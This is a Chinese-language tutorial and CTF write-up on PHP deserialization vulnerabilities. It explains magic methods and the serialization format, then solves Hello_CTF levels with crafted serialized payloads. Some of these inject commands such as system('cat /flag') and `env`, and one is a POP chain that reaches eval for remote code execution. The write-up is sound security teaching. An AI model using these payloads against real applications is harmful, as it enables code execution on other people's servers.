
[php反序列化从入门到放弃](https://www.cnblogs.com/bmjoker/p/13742666.html)
[Hello_CTF](https://hello-ctf.com/hc-web/php_unser_base/)

# 反序列化知识学习

## 一、PHP反序列化基础

### 1.php类与对象

类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。
```
<?php
class people{
   //定义类属性（类似变量）,public 代表可见性（公有）
    public $name = 'joker';
   //定义类方法（类似函数）
   public function smile(){
        echo $this->name." is smile...\n";
   }
}

$psycho = new people(); //根据people类实例化对象
$psycho->smile();
?>
```
上述代码定义了一个`people类`，并在在类中定义了一个`public类型`的变量`$name`和类方法`smile`。然后实例化一个对象`$psycho`，去调用people类里面的smile方法，打印出结果。

### 1.2魔术方法

为什么被称为魔法方法呢？因为是在触发了某个事件之前或之后，魔法函数会自动调用执行，而其他的普通函数必须手动调用才可以执行。PHP 将所有以 `__（两个下划线）`开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。下表为php常见的魔术方法：

| 方法名            | 作用                                                                                                |
| -------------- | ------------------------------------------------------------------------------------------------- |
| __construct    | 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值                                                                      |
| __destruct     | 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用                                                |
| __toString     | 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法                                        |
| __wakeup()     | 使用unserialize时触发，反序列化恢复对象之前调用该方法                                                                  |
| __sleep()      | 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化) |
| __destruct()   | 对象被销毁时触发                                                                                          |
| __call()       | 在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法                                                            |
| __callStatic() | 在静态上下文中调用不可访问的方法时触发                                                                               |
| __get()        | 读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）                                                           |
| __set()        | 在给不可访问属性赋值时，即在调用私有属性的时候会自动执行                                                                      |
| __isset()      | 当对不可访问属性调用isset()或empty()时触发                                                                      |
| __unset()      | 当对不可访问属性调用unset()时触发                                                                              |
| __invoke()     | 当脚本尝试将对象调用为函数时触发                                                                                  |
```
<?php
    class animal {
        private $name = 'caixukun';

        public function sleep(){
            echo "<hr>";
            echo $this->name . " is sleeping...\n";
        }
        public function __wakeup(){
            echo "<hr>";
            echo "调用了__wakeup()方法\n";
        }
        public function __construct(){
            echo "<hr>";
            echo "调用了__construct()方法\n";
        }
        public function __destruct(){
            echo "<hr>";
            echo "调用了__destruct()方法\n";
        }
        public function __toString(){
            echo "<hr>";
            echo "调用了__toString()方法\n";
        }
        public function __set($key, $value){
            echo "<hr>";
            echo "调用了__set()方法\n";
        }
        public function __get($key) {
            echo "<hr>";
            echo "调用了__get()方法\n";
        }
    }
    
    $ji = new animal();
    $ji->name = 1;
    echo $ji->name;
    $ji->sleep();
    $ser_ji = serialize($ji);
    //print_r($ser_ji);
    print_r(unserialize($ser_ji))
?>
```

![Pasted image 20250405133519](https://github.com/user-attachments/assets/53ae90c0-0da5-4f38-b9c2-a5dec9ed45e8)

### 1.3 php序列化/反序列化
在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。
- php序列化（serialize）：是将变量转换为可保存或传输的字符串的过程
- php反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用

这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。

常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。

> [!example] 序列化
```
<?php
class object{
    public $team = 'joker';
    private $team_name = 'hahaha';
    protected $team_group = 'biubiu';

    function hahaha(){
        $this->$team_members = '奥力给';
    }
}
$object = new object();
echo serialize($object);
?>
```

![Pasted image 20250405134037](https://github.com/user-attachments/assets/797a0d49-a49d-4987-ba43-eea2bea5748c)

以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。值得一提的是，类方法并不会参与到实例化里面。

> [!TIP] 不同的修饰符对序列化后的影响
> 需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化。
> 
> - 使用public修饰进行序列化后，变量$team的长度为4，正常输出。
> - 使用private修饰进行序列化后，会在变量$team_name前面加上类的名称，在这里是object，并且长度会比正常大小多2个字节，也就是9+6+2=17。
> - 使用protected修饰进行序列化后，会在变量$team_group前面加上*，并且长度会比正常大小多3个字节，也就是10+3=13。
> 
> 1. 受Private修饰的私有成员，序列化时: \x00 +  [私有成员所在类名]  + \x00 [变量名]
> 2. 受Protected修饰的成员，序列化时：\x00 + * + \x00 + [变量名]
> 其中，"\x00"代表ASCII为0的值，即空字节，" * " 必不可少

> [!tip] 序列化格式中的字母含义
```
a - array                    b - boolean  
d - double                   i - integer
o - common object            r - reference
s - string                   C - custom object
O - class                  N - null
R - pointer reference      U - unicode string
```

> [!example] 反序列化

反序列化的话，就依次根据规则进行反向复原。
这边定义一个字符串，然后使用反序列化函数unserialize进行反序列化处理，最后使用var_dump进行输出
```
<?php
    $ser = 'O:6:"object":3:{s:1:"a";i:1;s:4:"team";s:6:"hahaha";}';
    $ser = unserialize($ser);
    var_dump($ser);
?>
```

![Pasted image 20250405134831](https://github.com/user-attachments/assets/4c15d07c-4462-4594-a042-c63aeee8e942)

### 1.4 php反序列化漏洞（对象注入）

在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。

挖掘反序列化漏洞的条件是
```
1. 代码中有可利用的类，并且类中有__wakeup()，__sleep()，__destruct()这类特殊条件下可以自己调用的魔术方法。

2. unserialize()函数的参数可控。
```

#### php对象注入示例一：
```
<?php
class A{
    var $test = "demo";
    function __destruct(){
        @eval($this->test);
    }
}
$test = $_POST['test'];
$len = strlen($test)+1;
$p = "O:1:\"A\":1:{s:4:\"test\";s:".$len.":\"".$test.";\";}"; // 构造序列化对象
$test_unser = unserialize($p); // 反序列化同时触发_destruct函数
?>
```
 如上代码，最终的目的是通过调用`__destruct()`这个析构函数，将恶意的payload注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到`unserialize()`反序列化的时候，会触发`__destruct()`方法，同时也可以触发`__wakeup()`方法。但是如果想注入恶意payload，还需要对`$test`的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的$test变量进行覆盖。

![Pasted image 20250405135707](https://github.com/user-attachments/assets/7f258544-24ff-4108-af6d-49693ccb5700)

传入	参数`phpinfo()`

![Pasted image 20250405135749](https://github.com/user-attachments/assets/971878d3-daef-489f-bff2-7a42915464ff)

这样的话在调用__destruct方法执行eval之前就把变量$test的值替换为恶意payload



# 反序列化WP

## HELLO_CTF

### level 1-类的实例化

第一题非常的简单，考察如何把类实例化，我们只需要POST传参即可

![Pasted image 20250405164907](https://github.com/user-attachments/assets/cd9ee239-a7ae-45fd-aa8b-63347b7f7682)

### level 2 :值的传递

考察对象的赋值操作，相比于面向过程，对对象中值的更改，需要通过 `->` 符号来指向可修改的变量，这里的可修改指的是 控制修饰符 public 对应的值，像 protected 和 private 修饰的值，需要使用更复杂的修改方法。

对于任何可以修改的值，我们使用 `$对象名 -> 对应值 = 值` .eg: `$object_name->a="a"`

所以在这个题目中，我们需要将 `$flag_string` 赋值给 `$free_flag` 以便我们后面的 `get_free_flag()` 函数将他输出出来。

```
code=$target->$free_flag=$flag_string;     //理论上可写出，但实际一直刷新不出来

法二
code=var_dump($flag_string);     //var_dump是Php中的调试函数，用书显示变量的详细信息，包括类型和值

```

![Pasted image 20250405170149](https://github.com/user-attachments/assets/56f89a02-465f-4b13-9f6c-5d951d7dddf3)

### Level3-值的权限


> [!note] 前置知识点

考察 控制修饰符：
- **public（公有）：** 公有的类成员可以在任何地方被访问。
- **protected（受保护）：** 受保护的类成员则可以被其自身以及其子类和父类访问。(可继承)
- **private（私有）：** 私有的类成员则只能被其定义所在的类访问。(不可继承)

这里 SubFLAG 继承了 FLAG，除开 public 修饰的值，对于另外两个：

- `protected $protected_flag` 可以通过 `get_protected_flag()` / `get_private_flag()` 访问，因为受保护的变量是可以被继承的。
- `private $private_flag`则只能通过 `get_private_flag()` 进行访问，因为私有变量不能被继承。

而对象中函数的调用和值的访问类似，也通过 `->` 符号实现：`$对象名 -> 函数名();`

> [!success] 具体操作

先看源码，如图，我们只需要不停的调用其中的函数即可

![Pasted image 20250405171104](https://github.com/user-attachments/assets/9e1e2ba1-8570-444d-9482-a3cdb2c46015)

给出payload
```
调用出数值后，需要用echo打印到屏幕，否则网页空白
code=echo $target->public_flag;                   //NSSCTF{se3_me_
code=echo $sub_target->show_protected_flag();     //4nd_g3t_
code= echo $target->get_private_flag();           //mmmme}

我们还可以使用.操作符，一次性输出
code=echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();
```

> [!info] 补充的知识

- `SubFLAG extends FLAG`:表示FLAG是SubFLAG的父类，SubFLAG继承FLAG的所有pubilc和protected属性和方法，子类只能通过父类的**公有方法**才能间接访问私有属性
- `.`操作符可以用来拼接字符串

### level-4:序列化初体验

> [!NOTE] 前置知识

如何看序列化之后的数据

![Pasted image 20250405134037](https://github.com/user-attachments/assets/79be3a75-800c-47eb-b319-20fccbc1fdbb)

> [!tip] 序列化格式中的字母含义
> a - array                    b - boolean  
d - double                   i - integer
o - common object            r - reference
s - string                   C - custom object
O - class                  N - null
R - pointer reference      U - unicode string

> [!success] 具体操作

先来看源码解析，既然是序列化，我们只需要关注魔术方法即可

![Pasted image 20250405173540](https://github.com/user-attachments/assets/d82dd9e3-f5ff-4031-ac42-8335441c2512)

构造payload
```
code=echo serialize($flag_is_here);
```
获得下面序列化字符串
```
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```
拼凑一下flag值，字符串类型关注`s`，数字型关注`i`
```
ser4l1ze2se3me
```

### level-5: 普通值规则

> [!NOTE] 前置知识

其实就是如何看序列化后的值
如何看序列化之后的数据

![Pasted image 20250405134037](https://github.com/user-attachments/assets/67a29da9-e5c2-45d0-9f04-4bdce41f3566)

> [!tip] 序列化格式中的字母含义
> a - array                    b - boolean  
d - double                   i - integer
o - common object            r - reference
s - string                   C - custom object
O - class                  N - null
R - pointer reference      U - unicode string

演示和考察序列化中 不同类型变量的不同格式。
而从结果上理解，反序列化其实和参数创建是一个等同的过程 —— 比如下面的例子：
```
$a_string = "HelloCTF";
 /*<=等价于=>*/ 
 $a_string = unserialize('s:8:"HelloCTF";');
```

> [!success] 具体操作

老规矩，先查看源码

![Pasted image 20250405175512](https://github.com/user-attachments/assets/e6ce6105-784e-48bf-a9ed-4f4119c1efb6)

我们依据题目依次构造
```
o=O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}
a=a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}
s=s:5:"IWANT";
i=i:1
b=b:1
n=N
```
之后用&进行拼接，效果如下，使用post传参即可
```
o=O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}&s=s:5:"IWANT";&a=a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}&i=i:1;&b=b:1;&n=N;
```

![Pasted image 20250405180443](https://github.com/user-attachments/assets/b78f4310-2796-4381-8c09-f79deac536fa)

### level 6: 序列化规则_权限修饰

> [!NOTE] 前置知识

同样是演示和考察序列化中不同类型变量的不同格式，但这里比较特殊 —— 因为引入了控制修饰符。

在对象的序列化和反序列化中，不同控制修饰符，序列化出来的字符串是不同的：
```
<?php 

class Demo{
    public $a;
    protected $b;
    private $c;
}

echo urlencode(serialize(new Demo()));
#O%3A4%3A%22Demo%22%3A3%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A4%3A%22%00%2A%00b%22%3BN%3Bs%3A7%3A%22%00Demo%00c%22%3BN%3B%7D
# O:4:"Demo":3:{s:1:"a";N;s:4:"%00*%00b";N;s:7:"%00Demo%00c";N;}
```
这里的 `%00` 是一个**不可见**的控制字符-`NULL`，对比不难看出对应的规则：

- **protected（受保护）：** `%00*%00变量名`
- **private（私有）：** `%00类名%00变量名`

所以在序列化和反序列化的题目中 我们提倡在输出EXP的时候添加一个 `urlencode()` 以避免不可见字符的干扰。

在本题中只需要给对应的变量赋值即可，考察点是在输出的格式上面，由于不可见控制字符的带入，需要使用URL编码来避免丢失。

> [!success] 具体操作

先看下源码，这里其实只需要对`protected_key`和`private_key`进行赋值操作，具体赋值内容看条件判断

![Pasted image 20250405194550](https://github.com/user-attachments/assets/f866afe7-ae57-42b6-afaa-a014a25b5d57)

构造payload如下，我们打开自己的Php环境，输入下面代码，如图显示
```
<?php
class protectedKEY{
    protected $protected_key=protected_key;
}
class privateKEY{
    private $private_key=private_key;
}

$exp = "protected_key=".urlencode(serialize(new protectedKEY))."&private_key=".urlencode(serialize(new privateKEY));

echo $exp;
?>
```

![Pasted image 20250405194732](https://github.com/user-attachments/assets/2f9de2d3-4d49-4168-a994-0a94c2442b2a)

将拿到的序列化字符串POST传递即可

![Pasted image 20250405194824](https://github.com/user-attachments/assets/6f4f786c-434b-471e-9865-5a440db1786c)

### level 7:实例化和反序列化


> [!NOTE] 前置知识

实例化和反序列化的演示，并且简单的展示了反序列化漏洞的原理。

从结果上来看，实例化和反序列化是一样的，这都会去创建一个对象，但是如果目标类没有构造函数，那么其中的参数控制是不同的。

在没有构造函数时，实例化中对象的各种参数在类中已经决定好了，除非创建后修改；而反序列化则是根据序列化的字符串来**"还原"**对象的 —— 这也就意味着，我们可以通过改变序列化的字符串来决定他"**还原**"对象中各种量的值。
```
class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";

    function backdoor(){
        eval($this->flag_command);
    }
}
$Unserialize_object = unserialize('O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}');
```
比如在这个代码例子中，我们可以更改 `s:24:"echo 'Hello World!<br>';"` 这个字符串来做到控制最后 `backdoor()` 函数的执行结果。

核心就是：构造序列化字符串

> [!success] 具体操作

来看源码

![Pasted image 20250405195939](https://github.com/user-attachments/assets/cde38306-158f-4e83-876e-355b3f296a84)

明确需求后，我们把源码复制到我们的PHP环境中

![Pasted image 20250405201110](https://github.com/user-attachments/assets/7848ce61-55d6-4c96-ac71-02ada807e285)

之后将获得的反序列化字符POST上传即可

### level 8：魔术方法__construct和__destruct


> [!NOTE] 前置知识

| 方法名            | 作用                                                                                                |
| -------------- | ------------------------------------------------------------------------------------------------- |
| __construct    | 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值                                                                      |
| __destruct     | 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用                                                |
考察 构造函数 (`__construct()`) 和 析构函数 (`__destruct()`) ，并且引入了一些 PHP垃圾回收机制的知识点 —— 请注意，GC机制和析构函数息息相关。

构造函数只会在类实例化的时候 —— 也就是使用 new 的方法手动创建对象的时候才会触发，而通过反序列化创建的对象不会触发这一方法，这也是为什么，在前面的内容，我将反序列化的对象创建过程称作为 “**还原**”。

析构函数会在对象被回收的时候触发 —— 手动回收和自动回收。

手动回收：就是代码中演示的 unset 方法用于释放对象。

自动回收：对象没有值引用指向，或者脚本结束完全释放，具体看题目中的演示结合该部分文字应该不难理解。

题目要求 全局变量 标识符flag的值大于5，根据 __destruct() 和 PHP GC 的特性，我们可以不断地去序列化和反序列化一个对象，然后不给该对象具体的引用以触发自动销毁机制。

> [!success] 操作方法

老规矩，先看源码，给出了一个例子，同时本题创建一次就计算+1一次

![Pasted image 20250406101840](https://github.com/user-attachments/assets/374e6fe3-0ef6-48d7-a46a-2df3ca472047)
![Pasted image 20250406101854](https://github.com/user-attachments/assets/9219f6a1-0d92-452f-9617-ded00d4fa86e)

payload构造，根据补充知识可知，我们只需要不停的序列化反序列化化4次，再加上创建实例的一次，就达到了五次计数
```
code=unserialize(serialize(new REFLAG()))    //2
code=unserialize(serialize(unserialize(serialize(new REFLAG()))))   //3
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(new REFLAG()))))))     //4
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG())))))))));
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));
```



> [!INFO] 知识补充：什么是没有具体的引用？
- 当对象**没有被任何变量、数组或属性引用**时，PHP 会将其标记为“垃圾”。
```
$obj = new MyClass(); // $obj 是对象的引用
$obj = null;         // 取消引用，对象变为“无引用状态”
```
此时对象 `MyClass` 的实例没有引用指向它，GC 会触发 `__destruct()`。

**如何利用这一点？**
- 如果不断反序列化对象，**但不保留它们的引用**，每次反序列化的对象都会因无引用而被销毁，从而触发 `__destruct()`。
```
class Exploit {
    public function __destruct() {
        global $flag;
        if ($flag > 5) { /* 执行恶意逻辑 */ }
    }
}
// 反复反序列化且不保留引用
unserialize($serializedData); // 反序列化后对象无引用，立即触发 __destruct__
```

 **为什么这样能触发 `__destruct()`？**
- PHP 的垃圾回收机制（GC）会周期性地清理无引用的对象（引用计数为 0）。
- 反序列化后，如果没有将对象赋值给变量（如 `$obj = unserialize(...)`），该对象会**立即失去引用**，从而被 GC 回收，触发 `__destruct()`。


### LEVEL 9:构造函数的漏洞

> [!success] 具体操作

先看源码，这道题是让我们熟悉自己反序列化构造，我们只需要修改`flag_command`的值即可。复制到自己的PHP环境去，然后获得序列化字符串即可
![Pasted image 20250406105421](https://github.com/user-attachments/assets/11248887-0298-4104-94ce-b4ae2ed65e9d)

具体payload，理论上可行，但是不知道为什么一直出不来
```
<?php
class FLAG {
    var $flag_command = "system('cat /flag');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```
法二：使用`env`来获取所有变量,这个方法可行
```
<?php
class FLAG {
    var $flag_command = "`env`;";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

### level 10: 魔术方法__wakeup

> [!NOTE] 前置知识

正式的进入了反序列化的题目，这里我们从第一个常见的魔术方法 —— `__wakeup()` 开始。

> [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 会检查是否存在一个 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。
> 
> [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。
> 
> ——[【PHP 手册 - 魔术方法 # wakeup】](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)

当我们从序列化字符串还原对象，也就是进行反序列化操作的时候，wakeup方法会被触发：


> [!success] 具体操作

准备秒杀，直接看payload，输入即可
![Pasted image 20250406111448](https://github.com/user-attachments/assets/1cf14267-88b7-463f-baba-294e8ef2af2a)
![Pasted image 20250406111658](https://github.com/user-attachments/assets/c139b084-ca98-4615-9146-cb3a2083796a)


### level 11:CVE-2016-7124

> [!NOTE] 前置知识

复习一下序列化字符串
![[Pasted image 20250405134037.png]]

以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。值得一提的是，类方法并不会参与到实例化里面。


> [!success] 具体操作

老规矩先查看源码。分析看图即可
![Pasted image 20250405134037](https://github.com/user-attachments/assets/14faf1e0-85db-4b63-9c76-92e182bd4fcb)

复制代码到自己的Php环境中，如图操作，把修改后的值POST传参即可
![Pasted image 20250406112405](https://github.com/user-attachments/assets/47c30024-b8c5-4e1c-a47b-65c2d4170f97)


### level 12:魔术方法__sleep()


> [!NOTE] 前置知识

考察魔术方法 __sleep() 的使用。

serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。

- **必要的返回内容**：该方法必须返回一个数组: return array('属性1', '属性2', '属性3') / return ['属性1', '属性2', '属性3']，数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。
  
- **私有属性命名**：如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - `%00父类名称%00变量名` (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 "\0" - 注意在双引号中，PHP 才会解析转义字符和变量。)。
    - 例如，父类 FLAG 的私有属性 `private $f`; 应该在子类的 `__sleep()` 方法中以 "`\0FLAG\0f`" 的格式返回。

- **未返回任何内容**：如果 `__sleep()` 方法未返回任何内容或返回非数组类型，会触发 E_NOTICE 级别的错误，并且对象会被序列化为 `null` 空值。

该题目是一个 演示 + 实践 的组合题目（通俗点就是缝合怪（bushi

```html
return array($array_list[$_],$array_list[$__],$this->chance());
```

可以看到，每次我们请求的时候脚本都会返回两个随机数组，而这两个随机数组会决定我们看到的序列化字符串中涉及的变量，因此每次请求得到的字符串是不一样的。

而且下面的这部分代码告诉我们：

```html
$array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];
```

每一次随机的字符串都是单字符 —— 这也就意味着，当他调用父类对象中的私有属性时无法显示，因为前面我们说到：“如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - `%00父类名称%00变量名`”。

好在题目提供了另一个方法：`function chance() { return $_GET['chance']; }` 来让我们自定义反序列化的内容。

> [!success] 具体操作

先来看看源码是什么情况。
![Pasted image 20250406165523](https://github.com/user-attachments/assets/c505383f-b289-4007-8714-1d8c1307a9f4)
![Pasted image 20250406165847](https://github.com/user-attachments/assets/b21e6725-8687-456c-8220-35d87fc5f949)

研究了大半天研究明白了，`$this->chance()`会读取`chance()`表示的变量名，而我们的flag组成如下，即我们收集12个变量即可
```
$h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g
```
具体payload如下
```
?chance=h    //NSSCTF{
?chance=e     //Th3_
?chance=l     //__sleep_function_
?chance=I     //_is_
?chance=o     //called_"
?chance=c     //before_
?chance=t     //serialization_
?chance=f    //t0_
下面访问父类中的变量，注意访问私有变量需要用%00父类名称%00父类变量表示
?chance=%00FLAG%00f;    //clean_
?chance=%00FLAG%00l     //up_
下面访问父类中的受保护变量，使用%00*%00a表示
?chance=%00*%00a        //4nd_
访问父类中的公有变量，直接输入即可
?chance=g         //select_variab1es}
```
最终拼凑结果如下
```
NSSCTF{Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es}
```

### level 13:__toString()


> [!success] 具体操作

本关考验你魔法方法中的 __toString() 方法，你将有该方法的对象，打印出来，得到 Flag 方可过关，你明白吗（雾

__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。

题目已经完成了类的实例化：`$obj = new FLAG();`

所以我们只需要 POST 提交 `o=echo $obj;` 即可。

### level 14:__invoke


> [!success] 具体操作

该关卡考察魔术方法 __invoke()，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。例如 $obj()。

__invoke() 也可以接受参数，如题目所示：

```html
class FLAG{
    function __invoke($x) {
        if ($x == 'get_flag') {
            include 'flag.php';
            echo $flag;
        }
    }
}
$obj = new FLAG();
```

对象已经被实例化，我们需要给该对象传入 'get_flag' 字符串：

`o=$obj('get_flag');`,POST 提交即可。

### level 15:pop链前置

> [!NOTE] 前置知识

一个简单的POP链题目原理题 —— 虽然是POP链有多个对象但本质上只用到了__wakeUp()魔术方法。

在 PHP 的面向对象中，对象的成员属性可以是一个对象（这里的对象包括自己在内的对象和其他对象）。

在序列化和反序列化题目中，我们通常从终点向上查找，比如下面的题目： 很明显，终点是：`class destnation` — `public function action(){ eval($this->cmd->a->b->c); }`

接下来就是考虑去调用终点，查找所有类，最后在D类中可以看到：

```
class D { public function __wakeUp() { $this->d->action(); }
```

即 `__wakeUp()` 函数存在一个 `action()` 的函数调用，所以我们只需要让 `$this->d` 的值为 实例化的 `class destnation`即可


> [!success] 具体操作

先将代码复制到我们的php环境下，我们看到下面代码可知，最后调用c，那么我们就考虑将我们的RCE代码植入c中
`class destnation` — `public function action(){ eval($this->cmd->a->b->c); 
具体构造payload如下，发现能RCE成功，直接读取flag即可
![Pasted image 20250409000612](https://github.com/user-attachments/assets/35a22f5e-62da-4824-8ab9-558f2245deab)




